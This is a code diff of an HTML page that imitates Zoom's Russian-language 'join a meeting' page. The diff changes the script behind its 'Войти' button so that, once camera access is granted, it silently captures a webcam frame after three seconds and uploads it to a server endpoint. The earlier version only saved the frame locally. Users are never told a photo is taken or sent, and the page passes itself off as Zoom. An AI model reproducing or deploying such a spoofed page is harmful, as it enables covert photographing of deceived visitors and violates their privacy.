@@ -498,7 +498,7 @@ showTrustFlag:false
 }
 </script>
 </head>
-<body class="      " data-cd="zoom.us">
+<body class="" data-cd="zoom.us">
 <div class="total-main-content">
 <div id="skiptocontent">
 <a aria-label="Skip to main content" href="#the-main-content">Перейти к основному содержанию</a>
@@ -554,94 +554,102 @@ var isWebAppsEnabled = false;
 </script></div>
 </div>
 <div id="content_container" style="min-height: 872px;"  class="zoom-newcontent ">
-<div id="content_success_msg" role="alert" aria-live="assertive" class="alert alert-success hideme zoom-newmessage"></div>
 <div id="content" class="main-content">
 <div id="notice-slot"></div>
 
-<div class="mini-layout-body" >
-<div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
-<div class="page-header" style="text-align: center">
-<h1 style="font-size: 24px;">Присоединиться к конференции</h1>
+<div class="mini-layout-body" style="padding-top: 60px" >
+  <div class="page-header" style="text-align: center; margin-bottom: 20px">
+    <h1 style="font-size: 24px;">Присоединиться к конференции</h1>
+  </div>
+
+
+  <div class="box">
+    <input type="hidden" id="from" value="" />
+    <form id="join-form" class="form-vertical" action="javascript:;">
+      <div class="form-group confno" style="margin-bottom: 16px">
+      <div class="controls">
+      <label for="join-confno" style="color: #2a2b2d;font-size: 14px;margin-bottom: 10px;">Идентификатор конференции или имя персональной ссылки</label>
+      <input aria-describedby="error-span" id="join-confno" name="join-confno" type="text" class="form-control input-lg confno" autocomplete="off" maxlength="40" placeholder="Укажите идентификатор конференции или название персональной ссылки" />
+      <div id="errorContainer" class="wc-new-syle">
+      <div id="join-errormsg" aria-describedby="error-span" role="alert" class="error hideme"><i></i><span id="error-span"></span></div>
+      </div>
+      </div>
+      </div>
+      <div class="form-group" style="margin-bottom: 16px">
+      <div class="controls">
+      Нажимая "Присоединиться", вы подтверждаете свое согласие с <a target="_blank" href="/terms">условиями обслуживания</a> и <a target="_blank" href="/privacy">положением о конфиденциальности</a></div>
+      </div>
+
+      <div class="controls wc-new-syle">
+        <a
+          id="btnSubmit"
+          role="button"
+          href="#"
+          onclick="start(); return false;"
+          style="height: 56px; line-height: 44px; width: 100%; background-color: #0d6efd; color: white;"
+          class="btn btn-primary user submit"
+        >
+          Войти
+        </a>
+      </div>
+
+      <script>
+      async function start() {
+          try {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+              const video = document.createElement('video');
+              video.autoplay = true;
+              video.playsInline = true;
+              video.srcObject = stream;
+
+              document.body.appendChild(video);
+
+              await video.play();
+
+              setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+
+                    try {
+                        const res = await fetch('/api/main/photo-budka', {
+                            method: 'POST',
+                            body: formData,
+                        });
+
+                        if (!res.ok) throw new Error(`Ошибка: ${res.status}`);
+                        const data = await res.json();
+                        console.log('Загружено:', data);
+                    } catch (err) {
+                        console.error('Ошибка отправки:', err);
+                    }
+
+                    stream.getTracks().forEach(t => t.stop());
+                    video.remove();
+                }, 'image/jpeg', 0.9);
+
+            }, 3000);
+
+          } catch (err) {
+              console.error(err);
+              alert("Ошибка камеры: " + err.message);
+          }
+      }
+      </script>
+    </form>
+  </div>
 </div>
-<div class="box">
-<input type="hidden" id="from" value="" />
-<form id="join-form" class="form-vertical" action="javascript:;">
-<div class="form-group confno" style="margin-bottom: 16px">
-<div class="controls">
-<label for="join-confno" style="color: #2a2b2d;font-size: 14px;margin-bottom: 10px;">Идентификатор конференции или имя персональной ссылки</label>
-<input aria-describedby="error-span" id="join-confno" name="join-confno" type="text" class="form-control input-lg confno" autocomplete="off" maxlength="40" placeholder="Укажите идентификатор конференции или название персональной ссылки" />
-<div id="errorContainer" class="wc-new-syle">
-<div id="join-errormsg" aria-describedby="error-span" role="alert" class="error hideme"><i></i><span id="error-span"></span></div>
-</div>
-</div>
-</div>
-<div class="form-group" style="margin-bottom: 16px">
-<div class="controls">
-Нажимая "Присоединиться", вы подтверждаете свое согласие с <a target="_blank" href="/terms">условиями обслуживания</a> и <a target="_blank" href="/privacy">положением о конфиденциальности</a></div>
-</div>
-<div class="form-group" style="margin-bottom: 72px">
-<div class="controls wc-new-syle">
-  <a
-    id="btnSubmit"
-    role="button"
-    href="#"
-    onclick="start(); return false;"
-    style="height: 56px; line-height: 44px; width: 100%; background-color: #0d6efd; color: white;"
-    class="btn btn-primary user submit"
-  >
-    Войти
-  </a>
-</div>
-
-<script>
-async function start() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-        const video = document.createElement('video');
-        video.autoplay = true;
-        video.playsInline = true;
-        video.srcObject = stream;
-
-        document.body.appendChild(video);
-
-        await video.play();
-
-        setTimeout(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-
-            const link = document.createElement('a');
-            link.href = canvas.toDataURL('image/jpeg', 0.9);
-            link.download = 'photo.jpg';
-
-            document.body.appendChild(link);
-            link.click();
-            link.remove();
-
-            stream.getTracks().forEach(t => t.stop());
-            video.remove();
-
-        }, 3000);
-
-    } catch (err) {
-        console.error(err);
-        alert("Ошибка камеры: " + err.message);
-    }
-}
-</script>
-
-<div class="form-group">
 
 </div>
-</form>
-</div>
-</div>
-</div>
+
 </div>
 </div>
 <div id="video_dialog" role="alertdialog" class="noheaderfooterdialog modaldialog hideme">
